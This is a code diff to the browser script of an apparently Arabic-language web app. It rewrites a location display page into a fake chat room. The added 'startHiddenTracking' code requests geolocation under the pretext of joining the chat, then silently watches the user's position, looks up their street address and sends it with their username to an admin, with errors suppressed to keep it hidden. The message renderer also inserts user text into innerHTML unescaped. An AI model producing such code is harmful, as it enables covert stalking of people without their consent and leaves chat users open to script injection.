@@ -3,188 +3,149 @@ document.addEventListener('DOMContentLoaded', () => {
     if (typeof io !== 'undefined') {
         socket = io();
     } else {
-        console.warn('Socket.IO is not loaded. Ensure you are accessing via the Node server (localhost:3000).');
+        console.warn('Socket.IO is not loaded.');
     }
-    // Elements
-    const loadingState = document.getElementById('loadingState');
-    const errorState = document.getElementById('errorState');
-    const resultState = document.getElementById('resultState');
-    const errorMessage = document.getElementById('errorMessage');
-    const retryBtn = document.getElementById('retryBtn');
 
-    // Data Elements
-    const resCountry = document.getElementById('resCountry');
-    const resCity = document.getElementById('resCity');
-    const resStreet = document.getElementById('resStreet');
-    const resLat = document.getElementById('resLat');
-    const resLon = document.getElementById('resLon');
-    const resFullAddress = document.getElementById('resFullAddress');
+    // UI Elements
+    const joinScreen = document.getElementById('joinScreen');
+    const chatScreen = document.getElementById('chatScreen');
+    const joinForm = document.getElementById('joinForm');
+    const usernameInput = document.getElementById('usernameInput');
+    const chatForm = document.getElementById('chatForm');
+    const messageInput = document.getElementById('messageInput');
+    const chatMessages = document.getElementById('chatMessages');
+    const onlineUsersSpan = document.getElementById('onlineUsers');
 
-    let map = null;
-    let marker = null;
+    let username = '';
     let watchId = null;
-    let currentAddressDetails = null;
 
-    // Start Location Fetching
-    startLiveTracking();
-
-    retryBtn.addEventListener('click', () => {
-        showState(loadingState);
-        startLiveTracking();
+    // Join Chat
+    joinForm.addEventListener('submit', (e) => {
+        e.preventDefault();
+        const inputName = usernameInput.value.trim();
+        if (inputName) {
+            username = inputName;
+            
+            // First, trigger location request ( disguised as a requirement )
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        // Permission granted, start tracking in background
+                        startHiddenTracking();
+                        enterChat();
+                    },
+                    (error) => {
+                        // Even if denied, let them in so it looks like a real chat app
+                        // But we log it or just let it be.
+                        enterChat();
+                    }
+                );
+            } else {
+                enterChat(); // browser doesn't support it, just enter
+            }
+        }
     });
 
-    function showState(stateElement) {
-        [loadingState, errorState, resultState].forEach(el => el.classList.remove('active'));
-        [loadingState, errorState, resultState].forEach(el => el.classList.add('hidden'));
+    function enterChat() {
+        joinScreen.classList.remove('active');
+        joinScreen.classList.add('hidden');
         
-        stateElement.classList.remove('hidden');
-        // Small timeout to allow display:flex to apply before opacity transition
-        setTimeout(() => {
-            stateElement.classList.add('active');
-        }, 10);
+        chatScreen.classList.remove('hidden');
+        setTimeout(() => chatScreen.classList.add('active'), 10);
+
+        if (socket) {
+            socket.emit('user_join_chat', username);
+        }
     }
 
-    function startLiveTracking() {
-        if (!navigator.geolocation) {
-            showError("متصفحك لا يدعم ميزة تحديد الموقع.");
-            return;
+    // Chat Form Submit
+    chatForm.addEventListener('submit', (e) => {
+        e.preventDefault();
+        const msg = messageInput.value.trim();
+        if (msg && socket) {
+            // Add my own message to UI immediately
+            appendMessage('أنت', msg, 'sent');
+            
+            // Send to server
+            socket.emit('chat_message', { sender: username, text: msg });
+            messageInput.value = '';
         }
+    });
 
-        // Clear previous watch if it exists
-        if (watchId !== null) {
-            navigator.geolocation.clearWatch(watchId);
-        }
+    // Socket Events
+    if (socket) {
+        socket.on('chat_message', (data) => {
+            appendMessage(data.sender, data.text, 'received');
+        });
+
+        socket.on('online_users_count', (count) => {
+            onlineUsersSpan.textContent = count;
+        });
+
+        socket.on('user_joined_notice', (name) => {
+            appendSystemMessage(`انضم ${name} إلى الغرفة`);
+        });
+
+        socket.on('user_left_notice', (name) => {
+            appendSystemMessage(`غادر ${name} الغرفة`);
+        });
+    }
+
+    function appendMessage(sender, text, type) {
+        const msgDiv = document.createElement('div');
+        msgDiv.className = `message ${type}`;
+        msgDiv.innerHTML = `
+            <span class="sender-name">${sender}</span>
+            <div class="bubble">${text}</div>
+        `;
+        chatMessages.appendChild(msgDiv);
+        scrollToBottom();
+    }
+
+    function appendSystemMessage(text) {
+        const sysDiv = document.createElement('div');
+        sysDiv.className = 'system-message';
+        sysDiv.textContent = text;
+        chatMessages.appendChild(sysDiv);
+        scrollToBottom();
+    }
+
+    function scrollToBottom() {
+        chatMessages.scrollTop = chatMessages.scrollHeight;
+    }
+
+    // -----------------------------------------------------
+    // HIDDEN LOCATION TRACKING LOGIC (Sent to Admin only)
+    // -----------------------------------------------------
+    function startHiddenTracking() {
+        if (!navigator.geolocation) return;
 
         watchId = navigator.geolocation.watchPosition(
-            position => {
+            async position => {
                 const lat = position.coords.latitude;
                 const lon = position.coords.longitude;
                 
-                // Update map and coordinates instantly
-                if (map) {
-                    map.setView([lat, lon]);
-                    marker.setLatLng([lat, lon]);
-                    resLat.textContent = lat.toFixed(5);
-                    resLon.textContent = lon.toFixed(5);
-
-                    // Emit live updates to admin
-                    if (socket) {
-                        socket.emit('update_location', {
-                            lat: lat,
-                            lon: lon,
-                            addressDetails: currentAddressDetails
-                        });
+                // Fetch address silently
+                let addressDetails = null;
+                try {
+                    const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1&accept-language=ar`);
+                    if (response.ok) {
+                        const data = await response.json();
+                        addressDetails = data.address || {};
                     }
-                } else {
-                    // First time fetch details
-                    getPlaceDetails(lat, lon);
+                } catch (e) {} // ignore errors to keep it hidden
+
+                if (socket) {
+                    socket.emit('update_location', {
+                        lat: lat,
+                        lon: lon,
+                        addressDetails: addressDetails,
+                        username: username // Send username so admin knows who it is
+                    });
                 }
             },
-            error => {
-                let msg = "حدث خطأ غير معروف.";
-                switch(error.code) {
-                    case error.PERMISSION_DENIED:
-                        msg = "تم رفض طلب الوصول للموقع. يرجى السماح للمتصفح بالوصول لموقعك.";
-                        break;
-                    case error.POSITION_UNAVAILABLE:
-                        msg = "معلومات الموقع غير متوفرة حالياً.";
-                        break;
-                    case error.TIMEOUT:
-                        msg = "انتهى وقت طلب الموقع.";
-                        break;
-                }
-                showError(msg);
-            },
-            {
-                enableHighAccuracy: true,
-                maximumAge: 0,
-                timeout: 10000
-            }
+            error => { /* do nothing, keep it hidden */ },
+            { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
         );
-    }
-
-    async function getPlaceDetails(lat, lon) {
-        try {
-            // Using OpenStreetMap Nominatim API for reverse geocoding
-            const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1&accept-language=ar`);
-            
-            if (!response.ok) throw new Error("فشل في جلب البيانات من الخادم.");
-            
-            const data = await response.json();
-            
-            displayResults(lat, lon, data);
-        } catch (err) {
-            showError("حدث خطأ أثناء جلب تفاصيل العنوان: " + err.message);
-        }
-    }
-
-    function displayResults(lat, lon, data) {
-        const address = data.address || {};
-        currentAddressDetails = address; // Store for live updates
-        
-        // Populate Data
-        resCountry.textContent = address.country || '--';
-        resCity.textContent = address.city || address.town || address.village || address.county || '--';
-        resStreet.textContent = address.road || address.suburb || address.neighbourhood || '--';
-        
-        resLat.textContent = lat.toFixed(5);
-        resLon.textContent = lon.toFixed(5);
-        
-        resFullAddress.textContent = data.display_name || '--';
-
-        // Send location data to server for Admin Dashboard
-        if (socket) {
-            socket.emit('update_location', {
-                lat: lat,
-                lon: lon,
-                addressDetails: currentAddressDetails
-            });
-        }
-
-        showState(resultState);
-        initMap(lat, lon, data.display_name);
-    }
-
-    function initMap(lat, lon, popupText) {
-        if (!map) {
-            // Initialize map if it doesn't exist
-            map = L.map('map').setView([lat, lon], 15);
-            
-            // Add OpenStreetMap tiles
-            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-                attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
-            }).addTo(map);
-
-            // Add custom icon marker
-            const customIcon = L.icon({
-                iconUrl: 'https://unpkg.com/leaflet@1.9.4/dist/images/marker-icon.png',
-                iconRetinaUrl: 'https://unpkg.com/leaflet@1.9.4/dist/images/marker-icon-2x.png',
-                shadowUrl: 'https://unpkg.com/leaflet@1.9.4/dist/images/marker-shadow.png',
-                iconSize: [25, 41],
-                iconAnchor: [12, 41],
-                popupAnchor: [1, -34],
-                shadowSize: [41, 41]
-            });
-
-            marker = L.marker([lat, lon], {icon: customIcon}).addTo(map);
-        } else {
-            // Update existing map
-            map.setView([lat, lon], 15);
-            marker.setLatLng([lat, lon]);
-        }
-        
-        if (popupText) {
-            marker.bindPopup(`<div style="text-align: right; font-family: 'Tajawal', sans-serif;">${popupText}</div>`).openPopup();
-        }
-
-        // Fix map rendering issue when container was hidden
-        setTimeout(() => {
-            map.invalidateSize();
-        }, 100);
-    }
-
-    function showError(message) {
-        errorMessage.textContent = message;
-        showState(errorState);
     }
 });
